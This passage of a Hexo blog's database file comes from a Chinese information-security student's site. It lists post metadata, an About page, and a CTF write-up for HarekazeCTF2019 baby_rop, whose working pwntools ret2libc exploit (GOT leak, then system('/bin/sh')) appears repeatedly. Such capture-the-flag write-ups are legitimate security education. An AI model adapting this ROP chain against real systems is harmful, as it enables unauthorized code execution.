UAF.md","hash":"3340cd6c23d306b779871a7a0a7aff9343f1c65c","modified":1671784197937},{"_id":"source/_posts/mips语言学习/mips堆栈.md","hash":"6f8103f1431bf619f2c43f8418ecb4e6902880fc","modified":1671784018280},{"_id":"source/_posts/固件仿真/CVE-2019-17621.md","hash":"1c62361984a227dd283ca9c7260c6dadba991f6b","modified":1671784204838},{"_id":"source/_posts/固件仿真/qemu仿真mips程序.md","hash":"ae7e0d5240ddd504cea8d13c6c06b3b16685f09c","modified":1671784208621},{"_id":"source/_posts/杂项/小黄鸡.md","hash":"ce1d228067bd01c6294e9f0c89ce2ceca43c0ae8","modified":1671784890251},{"_id":"source/_posts/杂项/菜鸡的2022datacon.md","hash":"c7d2010590373a5a77fa9a91da311552bd1dde02","modified":1671785199291},{"_id":"source/_posts/杂项/遇到的奇奇怪怪问题汇总.md","hash":"059b9293ca0b49f60b0fb806cc3c8afd2eb34720","modified":1692684668319},{"_id":"public/categories/mips语言学习/index.html","hash":"bd06d2ded1bfeddb1f0a1732207e57c12a82c7d3","modified":1671784020871},{"_id":"public/2022/12/23/mips语言学习/mips堆栈/index.html","hash":"2b6ddaa67b39d49069955d115f3d13b67a6302b7","modified":1671784242396},{"_id":"public/categories/ctf-pwn/index.html","hash":"fa6aee3f34af06db6895440a7baf7a064708b6d2","modified":1692712827552},{"_id":"public/categories/固件仿真/index.html","hash":"622a3db90e571eb6e00ce99ea3d62ba7edb396d3","modified":1692684832352},{"_id":"public/2022/12/23/固件仿真/qemu仿真mips程序/index.html","hash":"d5e5f1a71c79dcc40df929e89034b0039243ed78","modified":1672666215726},{"_id":"public/2022/12/17/固件仿真/CVE-2019-17621/index.html","hash":"e49255a6cd0ca7946b5e78ca2e39f7b966ff1878","modified":1678775549066},{"_id":"public/2022/12/11/杂项/菜鸡的2022datacon/index.html","hash":"9d2ef0ada54e7437323e7d8a415c79bff5ce2e17","modified":1672666215726},{"_id":"public/2022/11/29/杂项/遇到的奇奇怪怪问题汇总/index.html","hash":"bc670824e417eb43a37c0d28b977fd96eff0291c","modified":1692684832352},{"_id":"public/2022/11/29/ctf-pwn/[ZJCTF 2019]EasyHeap/index.html","hash":"f600147eb8dc1dc7420d874aa2f7ef72752c158d","modified":1671784242396},{"_id":"public/2022/11/27/ctf-pwn/Off-By-One/index.html","hash":"0798bd0d7a2f7592af46a064e5911f99525f3cc7","modified":1671784242396},{"_id":"public/2022/11/27/ctf-pwn/patchelf修改程序libc版本/index.html","hash":"0e0c38043dadfae956b6d0f82faa2bfba7526d92","modified":1671784242396},{"_id":"public/2022/11/25/ctf-pwn/unlink/index.html","hash":"1bb630dbdbee4bca741e807235339b785b6d5b91","modified":1671784242396},{"_id":"public/2022/11/22/ctf-pwn/堆利用 UAF/index.html","hash":"74c08483fe56f98892a91afefdc83e90671f450f","modified":1671784242396},{"_id":"public/2022/11/18/ctf-pwn/heap exploitation/index.html","hash":"17b3b1a12a2380ca86f3e6975c88ca7455331701","modified":1671784242396},{"_id":"public/2022/11/16/ctf-pwn/ROP ciscn_2019_c_1/index.html","hash":"6da31350f6b110dee3194d0e8058adcb21e22915","modified":1692712827552},{"_id":"public/2022/11/16/ctf-pwn/HarekazeCTF2019baby_rop/index.html","hash":"6c9535f074e2f83f5c41754c29119bac26bcb8ef","modified":1692712827552},{"_id":"public/2022/11/16/ctf-pwn/got表和plt表/index.html","hash":"54db58c4a7f0784e45fb5e692bc04574a3e986f8","modified":1671784242396},{"_id":"public/2022/11/16/杂项/小黄鸡/index.html","hash":"1bec40b78baf3f8072ba7ffe62240ab16b454284","modified":1671784908245},{"_id":"public/categories/杂项/index.html","hash":"70abba8205c0f7dad9eea51ebd4f3c5f929f5f97","modified":1672666215726},{"_id":"public/categories/misc/index.html","hash":"fe79d93db08a484a4d9b8770562215b57e82d369","modified":1671784908245},{"_id":"source/_posts/mips汇编/mips堆栈.md","hash":"4b6edb98fc940059de7c00d6b2ef9e42ce6279a7","modified":1678784410237},{"_id":"themes/hexo-theme-fluid-master/source/img/mips/2.jpg","hash":"21ac5873e7e3a1dd8cea02a5bd4400cc9cc26984","modified":1671807276298},{"_id":"themes/hexo-theme-fluid-master/source/img/mips/3.jpg","hash":"6de6103b4ec1071968f15105cb5878287ebc44c0","modified":1671859853645},{"_id":"themes/hexo-theme-fluid-master/source/img/mips/1.jpg","hash":"c25c7707965dcf9f7c107cd2b0b385ba83c36869","modified":1671804956960},{"_id":"themes/hexo-theme-fluid-master/source/img/mips/4.jpg","hash":"726a518bf7a2f8fb458bf842eb320ba461d85c7e","modified":1671860658558},{"_id":"public/2022/12/23/mips汇编/mips堆栈/index.html","hash":"b0c2dc81c8a1b9ab9dbe3e99bd6398c302749423","modified":1683800901003},{"_id":"public/categories/mips汇编/index.html","hash":"fd1a63eb17ba41aa6a79746574d5dd8d26a0ce25","modified":1678775663271},{"_id":"public/img/mips/2.jpg","hash":"21ac5873e7e3a1dd8cea02a5bd4400cc9cc26984","modified":1672666215726},{"_id":"public/img/mips/3.jpg","hash":"6de6103b4ec1071968f15105cb5878287ebc44c0","modified":1672666215726},{"_id":"public/img/mips/1.jpg","hash":"c25c7707965dcf9f7c107cd2b0b385ba83c36869","modified":1672666215726},{"_id":"public/img/mips/4.jpg","hash":"726a518bf7a2f8fb458bf842eb320ba461d85c7e","modified":1672666215726},{"_id":"source/_posts/mips汇编/mips汇编.md","hash":"41487924c59601aa05fb5fb8470b1201ac3bb561","modified":1678775653846},{"_id":"source/_posts/固件仿真/如何用qemu仿真mips程序.md","hash":"3819331bc33ed74a6de8752f5735192f62fb6f5d","modified":1672724612197},{"_id":"themes/hexo-theme-fluid-master/source/img/DIR-815/1.jpg","hash":"f9a098dd0354475038c1bed161203b1497a7d7e8","modified":1672725609527},{"_id":"themes/hexo-theme-fluid-master/source/img/DIR-815/2.jpg","hash":"e3bd9e3b31cb8aac37cd75f2f6b8ddea2aed5f92","modified":1672726280401},{"_id":"public/2022/12/23/mips汇编/mips汇编/index.html","hash":"b6cd84850f961483f128487ca7c96eff3f8cffd5","modified":1678775663271},{"_id":"public/2022/12/23/固件仿真/如何用qemu仿真mips程序/index.html","hash":"ed36bf9c3990082ea9fd528d916975ee0d904c21","modified":1678775663271},{"_id":"public/tags/assembly/index.html","hash":"c056b77a789301261ef21787b8fa09e4180459d3","modified":1678775663271},{"_id":"public/img/DIR-815/1.jpg","hash":"f9a098dd0354475038c1bed161203b1497a7d7e8","modified":1678775549066},{"_id":"public/img/DIR-815/2.jpg","hash":"e3bd9e3b31cb8aac37cd75f2f6b8ddea2aed5f92","modified":1678775549066},{"_id":"source/_posts/mips汇编/mips栈溢出例题.md","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1678776288933},{"_id":"source/_posts/ctf-pwn/保护机制.md","hash":"a16ad552ff9bfd3384f1b5de0c2b1b7e832b844e","modified":1678784914257},{"_id":"public/archives/2023/index.html","hash":"54a852fba3ee2bb71a8c8d80101775defba593dd","modified":1692712827552},{"_id":"public/archives/2023/03/index.html","hash":"e12cd3ddceaee3a900487013c1d7dad517dc4f76","modified":1692712827552},{"_id":"public/tags/ctf-pwn/page/2/index.html","hash":"b7c8378f4f75bd3532f267c8b85efc73a882dddf","modified":1692712827552},{"_id":"public/2023/03/14/mips汇编/mips栈溢出例题/index.html","hash":"f470be91f6a2cab163af3e2ea4cdbc2a8d4b1ad7","modified":1678784943345},{"_id":"public/2023/03/14/ctf-pwn/保护机制/index.html","hash":"f7a3c5ca780b7c0c9664e2669894c1d56a0a3ce2","modified":1683800901003},{"_id":"source/_posts/ctf-pwn/[HarekazeCTF2019]baby_rop2.md","hash":"363a10496910ea92e021158a07c1210157ab7ad1","modified":1682048538666},{"_id":"source/_posts/fuzz/fuzz.md","hash":"5499af505f0262463b37b588ff3a4c6ace90d405","modified":1679287770801},{"_id":"public/archives/2023/04/index.html","hash":"6e5136705cd35c882ca6f74e74cc728ee6b3843e","modified":1692712827552},{"_id":"public/categories/ctf-pwn/page/2/index.html","hash":"af4eda0024e9531cc7050568bda9045895ae761e","modified":1692712827552},{"_id":"public/categories/fuzz/index.html","hash":"1535aa18ab07509638c1b5b3f609a0543ece8b33","modified":1682048929500},{"_id":"public/tags/fuzz/index.html","hash":"8f93f6f14872676d77a4d6789bacafb47ebdbd60","modified":1682048929500},{"_id":"public/tags/afl/index.html","hash":"bfdcf683c338c345fa43d44102faea6b8679d3a9","modified":1682048929500},{"_id":"public/2023/03/15/fuzz/fuzz/index.html","hash":"b5cdfb40c63c1c5790ed912a161407dd069d6aa8","modified":1682048929500},{"_id":"public/2023/04/21/ctf-pwn/[HarekazeCTF2019]baby_rop2/index.html","hash":"b327a7db0128c9762fa0c8dfaa8196f8dfaadf74","modified":1682310325041},{"_id":"source/_posts/ctf-pwn/pwnable_simple_login.md","hash":"b88070b2d25d9438c1bde5463f15e37368db9d24","modified":1682310074280},{"_id":"source/_posts/ctf-pwn/get_started_3dsctf_2016.md","hash":"4a3a7392f7617387b0ba54f43fad8c40a16dc317","modified":1682057831390},{"_id":"source/_posts/ctf-pwn/bjdctf_2020_babyrop.md","hash":"a0f969ee1fe07e0a4a8d8cbd6177a089378a7e00","modified":1682051486342},{"_id":"themes/hexo-theme-fluid-master/source/img/pwnable_simple_login/1.jpg","hash":"f49439ffa2bd22ecace4960f14e81487faa002fd","modified":1682308584815},{"_id":"themes/hexo-theme-fluid-master/source/img/pwnable_simple_login/2.jpg","hash":"58c71ea7b7901780ed3a46341c9cf531e3ebd89d","modified":1682309460130},{"_id":"public/page/3/index.html","hash":"1ef8f8fe8b82f063f82f34102f829c73da58a38d","modified":1692712827552},{"_id":"public/archives/page/3/index.html","hash":"b7bb4cfd217de4b7a27f5de0d80f79454d612757","modified":1692712827552},{"_id":"public/2023/04/24/ctf-pwn/pwnable_simple_login/index.html","hash":"bebb32141bb2b81ec6fe367c2904ef75feeb6e23","modified":1683002083886},{"_id":"public/2023/04/21/ctf-pwn/get_started_3dsctf_2016/index.html","hash":"91d2afda9751bcb14cbfef98192d7de7cd499816","modified":1682310325041},{"_id":"public/2023/04/21/ctf-pwn/bjdctf_2020_babyrop/index.html","hash":"60d4a68a3ed8c8782878c60d23e1666937aa9c2f","modified":1682310325041},{"_id":"public/img/pwnable_simple_login/2.jpg","hash":"58c71ea7b7901780ed3a46341c9cf531e3ebd89d","modified":1682310325041},{"_id":"public/img/pwnable_simple_login/1.jpg","hash":"f49439ffa2bd22ecace4960f14e81487faa002fd","modified":1682310325041},{"_id":"source/_posts/linux kernel/linux kernel.md","hash":"bea203c43303c7b7cc345391cf20ce68b055f229","modified":1683287444465},{"_id":"themes/hexo-theme-fluid-master/source/img/problems/1.jpg","hash":"8fae5c34f35aad196d5c68c78d5ee29c8c6b24f3","modified":1683000237770},{"_id":"public/2023/05/01/linux kernel/linux kernel/index.html","hash":"ca701362b643c5fc468e93fad1c9623453daedbb","modified":1683800901003},{"_id":"public/categories/linux-kernel/index.html","hash":"5f7a500858ccde2ea3c3301cb165e0bd36bbe648","modified":1683002083886},{"_id":"public/archives/2023/05/index.html","hash":"0ce9442bc72e7985bc9479452dea7369b30bec4e","modified":1692712827552},{"_id":"public/tags/驱动开发/index.html","hash":"bc9fabbd43e47f1a761c5f0411604b61095f5ea0","modified":1683002083886},{"_id":"public/tags/kernel漏洞/index.html","hash":"aa064f11169b544a92a7892edfb673253249844b","modified":1683002083886},{"_id":"public/img/problems/1.jpg","hash":"8fae5c34f35aad196d5c68c78d5ee29c8c6b24f3","modified":1683002083886},{"_id":"source/_posts/固件仿真/ctf-firmware.md","hash":"0d7e30637200256c70c772144c6ff7e87fc5af6a","modified":1683870302503},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/11.jpg","hash":"25d2c428de33332df419352a0f5a31098708361c","modified":1683717622906},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/10.jpg","hash":"99b11b6056d7562fe0863cf2aa92a78b8a2a07a2","modified":1683717216392},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/1.jpg","hash":"2d8bae54a1fd714619e2dc510830948aa6a30102","modified":1683705706096},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/14.jpg","hash":"e2e33869e170206af9dc3983b7d3258d3b4b97ee","modified":1683780813527},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/12.jpg","hash":"fae3e31c68adda46a4236580d83fc272632af92a","modified":1683718206875},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/15.jpg","hash":"d54c49c32a37473b2adf80c6809a4a75e136b2f8","modified":1683780913199},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/3.jpg","hash":"18e984af26b3eee358fc7fb2bd091a987b4ddca3","modified":1683705879400},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/6.jpg","hash":"16c21f717f8e84e659681e2174dd59af42d61c2c","modified":1683707442119},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/4.jpg","hash":"643b107f948432215421056f31c87444579bd320","modified":1683706908629},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/7.jpg","hash":"3255c462e6678173178724a46120b3c36588bbf1","modified":1683707510717},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/8.jpg","hash":"41718eba430bec2708491c8cc8b917c9bf2504ec","modified":1683715373123},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/5.jpg","hash":"072b3ac577c194a25adbb6b7af4fc39b9e486e22","modified":1683707327194},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/9.jpg","hash":"02d3e6a2dc2e8adc737acc21c10347d8714be842","modified":1683717009203},{"_id":"themes/hexo-theme-fluid-master/source/img/kernel/1.jpg","hash":"fe5d2112dacd31be8ecf49bd7bf07e93084069ad","modified":1683005371146},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/13.jpg","hash":"39baf717081f340eb11d4d9a7acc00c1fc114186","modified":1683780674444},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/2.jpg","hash":"338deb1b7d9c35cd2265eb00ab0893efe3137933","modified":1683705786241},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/13_.jpg","hash":"75d94145d3f9f26b26d83c45b251029dd8a21a4d","modified":1683781947473},{"_id":"public/2023/05/10/固件仿真/ctf-firmware/index.html","hash":"9c72d66e11d9a35eed65a45830506e09657e4e24","modified":1692684832352},{"_id":"public/img/firmware/1.jpg","hash":"2d8bae54a1fd714619e2dc510830948aa6a30102","modified":1683800901003},{"_id":"public/img/firmware/10.jpg","hash":"99b11b6056d7562fe0863cf2aa92a78b8a2a07a2","modified":1683800901003},{"_id":"public/img/firmware/11.jpg","hash":"25d2c428de33332df419352a0f5a31098708361c","modified":1683800901003},{"_id":"public/img/firmware/12.jpg","hash":"fae3e31c68adda46a4236580d83fc272632af92a","modified":1683800901003},{"_id":"public/img/firmware/14.jpg","hash":"e2e33869e170206af9dc3983b7d3258d3b4b97ee","modified":1683800901003},{"_id":"public/img/firmware/3.jpg","hash":"18e984af26b3eee358fc7fb2bd091a987b4ddca3","modified":1683800901003},{"_id":"public/img/firmware/6.jpg","hash":"16c21f717f8e84e659681e2174dd59af42d61c2c","modified":1683800901003},{"_id":"public/img/firmware/15.jpg","hash":"d54c49c32a37473b2adf80c6809a4a75e136b2f8","modified":1683800901003},{"_id":"public/img/firmware/5.jpg","hash":"072b3ac577c194a25adbb6b7af4fc39b9e486e22","modified":1683800901003},{"_id":"public/img/firmware/8.jpg","hash":"41718eba430bec2708491c8cc8b917c9bf2504ec","modified":1683800901003},{"_id":"public/img/firmware/4.jpg","hash":"643b107f948432215421056f31c87444579bd320","modified":1683800901003},{"_id":"public/img/kernel/1.jpg","hash":"fe5d2112dacd31be8ecf49bd7bf07e93084069ad","modified":1683800901003},{"_id":"public/img/firmware/9.jpg","hash":"02d3e6a2dc2e8adc737acc21c10347d8714be842","modified":1683800901003},{"_id":"public/img/firmware/7.jpg","hash":"3255c462e6678173178724a46120b3c36588bbf1","modified":1683800901003},{"_id":"public/img/firmware/13.jpg","hash":"39baf717081f340eb11d4d9a7acc00c1fc114186","modified":1683800901003},{"_id":"public/img/firmware/13_.jpg","hash":"75d94145d3f9f26b26d83c45b251029dd8a21a4d","modified":1683800901003},{"_id":"public/img/firmware/2.jpg","hash":"338deb1b7d9c35cd2265eb00ab0893efe3137933","modified":1683800901003},{"_id":"source/_posts/固件仿真/Vxworks.md","hash":"a4b2ec085ec2b96b0106489db8d81bb4eaf1f6ec","modified":1683946982592},{"_id":"themes/hexo-theme-fluid-master/source/img/VxWorks/1.jpg","hash":"5c691441c30d0525d4d6a8d31c2cb51f5408e2ab","modified":1683871473334},{"_id":"themes/hexo-theme-fluid-master/source/img/VxWorks/4.jpg","hash":"8e53782492775e0d91ebe6136de37c84b21eb2d0","modified":1683873097530},{"_id":"themes/hexo-theme-fluid-master/source/img/firmware/16.jpg","hash":"5baad110621600e1ad4109139a062575b57aa890","modified":1683869598304},{"_id":"themes/hexo-theme-fluid-master/source/img/VxWorks/3.jpg","hash":"6de0cbf518d57f4bd36a5c99e268c6bf00cd1eb2","modified":1683871843710},{"_id":"themes/hexo-theme-fluid-master/source/img/VxWorks/2.jpg","hash":"ebadc1d38b0c8b9654d610db38d73f3498e69711","modified":1683871767118},{"_id":"public/2023/05/12/固件仿真/Vxworks/index.html","hash":"9583b8d7e74ba794479f35c3db179fbbeb3d7fd3","modified":1692684832352},{"_id":"public/img/VxWorks/4.jpg","hash":"8e53782492775e0d91ebe6136de37c84b21eb2d0","modified":1692684832352},{"_id":"public/img/VxWorks/1.jpg","hash":"5c691441c30d0525d4d6a8d31c2cb51f5408e2ab","modified":1692684832352},{"_id":"public/img/firmware/16.jpg","hash":"5baad110621600e1ad4109139a062575b57aa890","modified":1692684832352},{"_id":"public/img/VxWorks/3.jpg","hash":"6de0cbf518d57f4bd36a5c99e268c6bf00cd1eb2","modified":1692684832352},{"_id":"public/img/VxWorks/2.jpg","hash":"ebadc1d38b0c8b9654d610db38d73f3498e69711","modified":1692684832352},{"_id":"source/_posts/ctf-pwn/ciscn_2019_n_5.md","hash":"7aded9df40637322abdd3e6cdb2fea803ad473d4","modified":1692712534444},{"_id":"themes/hexo-theme-fluid-master/source/img/ciscn_2019_n_5/1.jpg","hash":"a0f3784dc1a802947bcf90a7d1eb5b4e208514eb","modified":1692711636492},{"_id":"themes/hexo-theme-fluid-master/source/img/ciscn_2019_n_5/2.jpg","hash":"229c9e55f1985257650f4798648bdca6d12c9a72","modified":1692711846686},{"_id":"themes/hexo-theme-fluid-master/source/img/ciscn_2019_n_5/3.jpg","hash":"0d2f1006a93616a14deeed383d3f7fc9ef20c74c","modified":1692711904941},{"_id":"themes/hexo-theme-fluid-master/source/img/ciscn_2019_n_5/4.jpg","hash":"bd6888ec83de0f28f5d470e35577231ccae1be09","modified":1692712196154},{"_id":"public/tags/exp/page/2/index.html","hash":"2e2d23716a03cf34830f03f178800a1adf26e8f8","modified":1692712827552},{"_id":"public/2022/11/16/ctf-pwn/ciscn_2019_n_5/index.html","hash":"28763b3c80e4cd452d037a1613534e843ef577de","modified":1692712827552},{"_id":"public/img/ciscn_2019_n_5/1.jpg","hash":"a0f3784dc1a802947bcf90a7d1eb5b4e208514eb","modified":1692712827552},{"_id":"public/img/ciscn_2019_n_5/4.jpg","hash":"bd6888ec83de0f28f5d470e35577231ccae1be09","modified":1692712827552},{"_id":"public/img/ciscn_2019_n_5/2.jpg","hash":"229c9e55f1985257650f4798648bdca6d12c9a72","modified":1692712827552},{"_id":"public/img/ciscn_2019_n_5/3.jpg","hash":"0d2f1006a93616a14deeed383d3f7fc9ef20c74c","modified":1692712827552}],"Category":[{"name":"mips语言学习","_id":"clc091iir0001n0ufcjlj1nu3"},{"name":"ctf-pwn","_id":"clc0969gd000278uf7pep918u"},{"name":"固件仿真","_id":"clc0969gq000s78ufgvl5gryp"},{"name":"杂项","_id":"clc09kj890000voufb2vid6u7"},{"name":"misc","_id":"clc09kj8s0004vouf5dbu0lrm"},{"name":"mips汇编","_id":"clceua2op0001h4ufhgc2ctbi"},{"name":"fuzz","_id":"clgq0i4ra0005r8uf726143dx"},{"name":"linux kernel","_id":"clh5rzm9j0001zcufcn0bbi68"}],"Data":[],"Page":[{"title":"简介","layout":"about","date":"2022-11-16T06:53:50.000Z","_content":"# ☀️A simple homepage🐤\n\n😺 南开大学2019级信息安全专业本科生（很快就不是了）\n\n😶 一只什么也不会的菜鸡\n\n🏀 本站内容更新一切随缘\n\n🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 \n\n","source":"about/index.md","raw":"---\ntitle: 简介\nlayout: about\ndate: 2022-11-16 14:53:50\n---\n# ☀️A simple homepage🐤\n\n😺 南开大学2019级信息安全专业本科生（很快就不是了）\n\n😶 一只什么也不会的菜鸡\n\n🏀 本站内容更新一切随缘\n\n🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 \n\n","updated":"2022-11-16T15:53:43.411Z","path":"about/index.html","_id":"clajrmefr0000kgufarvz2vz8","comments":1,"content":"<h1 id=\"☀️A-simple-homepage🐤\"><a href=\"#☀️A-simple-homepage🐤\" class=\"headerlink\" title=\"☀️A simple homepage🐤\"></a>☀️A simple homepage🐤</h1><p>😺 南开大学2019级信息安全专业本科生（很快就不是了）</p>\n<p>😶 一只什么也不会的菜鸡</p>\n<p>🏀 本站内容更新一切随缘</p>\n<p>🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"☀️A-simple-homepage🐤\"><a href=\"#☀️A-simple-homepage🐤\" class=\"headerlink\" title=\"☀️A simple homepage🐤\"></a>☀️A simple homepage🐤</h1><p>😺 南开大学2019级信息安全专业本科生（很快就不是了）</p>\n<p>😶 一只什么也不会的菜鸡</p>\n<p>🏀 本站内容更新一切随缘</p>\n<p>🙆 如果对文章内容有任何不理解或认为有误的地方，欢迎写issue或者直接加v开喷 </p>\n"}],"Post":[{"title":"HarekazeCTF2019 baby_rop","date":"2022-11-16T08:08:00.000Z","excerpt":"exp","_content":"\n**题目**\n\n<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop>\n\n从给定libc获取获取基址\n\n由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法\n\n不用给的libc文件的见下一道题，harekaze2019的babyrop2\n\n**Exp**\n\n```python\nfrom pwn import *\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn',28818)\ne = ELF('./pwn')\n\n#payload 1\npayload1 = '\\x00' + '\\xff' * 7\np.sendline(payload1)\np.recvuntil(\"Correct\\n\")\n\n#payload 2\npayload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)\n\np.sendline(payload2)\n\n# leak addr\nwrite_got = u32(p.recv(4))\nprint(hex(write_got))\n\n#payload 3\nlibc = ELF(\"./libc-2.23.so\")\nlibc.address =  write_got - libc.sym['write']\nsystem = libc.sym[\"system\"]\nbinsh = next(libc.search(b\"/bin/sh\"))\np.sendline(payload1)\npayload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)\np.sendline(payload3)\n\np.interactive()\n```\n\n","source":"_posts/ctf-pwn/HarekazeCTF2019baby_rop.md","raw":"---\ntitle: HarekazeCTF2019 baby_rop\ntags: [ctf-pwn,exp]\ndate: 2022-11-16 16:08:00\ncategories: [ctf-pwn]\nexcerpt: exp\n---\n\n**题目**\n\n<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop>\n\n从给定libc获取获取基址\n\n由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法\n\n不用给的libc文件的见下一道题，harekaze2019的babyrop2\n\n**Exp**\n\n```python\nfrom pwn import *\n\n# p = process('./pwn')\np = remote('node4.buuoj.cn',28818)\ne = ELF('./pwn')\n\n#payload 1\npayload1 = '\\x00' + '\\xff' * 7\np.sendline(payload1)\np.recvuntil(\"Correct\\n\")\n\n#payload 2\npayload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)\n\np.sendline(payload2)\n\n# leak addr\nwrite_got = u32(p.recv(4))\nprint(hex(write_got))\n\n#payload 3\nlibc = ELF(\"./libc-2.23.so\")\nlibc.address =  write_got - libc.sym['write']\nsystem = libc.sym[\"system\"]\nbinsh = next(libc.search(b\"/bin/sh\"))\np.sendline(payload1)\npayload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)\np.sendline(payload3)\n\np.interactive()\n```\n\n","slug":"ctf-pwn/HarekazeCTF2019baby_rop","published":1,"updated":"2023-04-21T03:45:06.422Z","_id":"clc0969g5000078uf2cc5as9m","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop\">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p>\n<p>从给定libc获取获取基址</p>\n<p>由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法</p>\n<p>不用给的libc文件的见下一道题，harekaze2019的babyrop2</p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">28818</span>)<br>e = ELF(<span class=\"hljs-string\">&#x27;./pwn&#x27;</span>)<br><br><span class=\"hljs-comment\">#payload 1</span><br>payload1 = <span class=\"hljs-string\">&#x27;\\x00&#x27;</span> + <span class=\"hljs-string\">&#x27;\\xff&#x27;</span> * <span class=\"hljs-number\">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class=\"hljs-string\">&quot;Correct\\n&quot;</span>)<br><br><span class=\"hljs-comment\">#payload 2</span><br>payload2 = (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(e.plt[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">0x08048825</span>) +p32(<span class=\"hljs-number\">1</span>) + p32(e.got[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">4</span>)<br><br>p.sendline(payload2)<br><br><span class=\"hljs-comment\"># leak addr</span><br>write_got = u32(p.recv(<span class=\"hljs-number\">4</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(write_got))<br><br><span class=\"hljs-comment\">#payload 3</span><br>libc = ELF(<span class=\"hljs-string\">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class=\"hljs-string\">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class=\"hljs-string\">&quot;system&quot;</span>]<br>binsh = <span class=\"hljs-built_in\">next</span>(libc.search(<span class=\"hljs-string\">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(system) + p32(<span class=\"hljs-number\">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop\">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p>\n<p>从给定libc获取获取基址</p>\n<p>由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法</p>\n<p>不用给的libc文件的见下一道题，harekaze2019的babyrop2</p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span 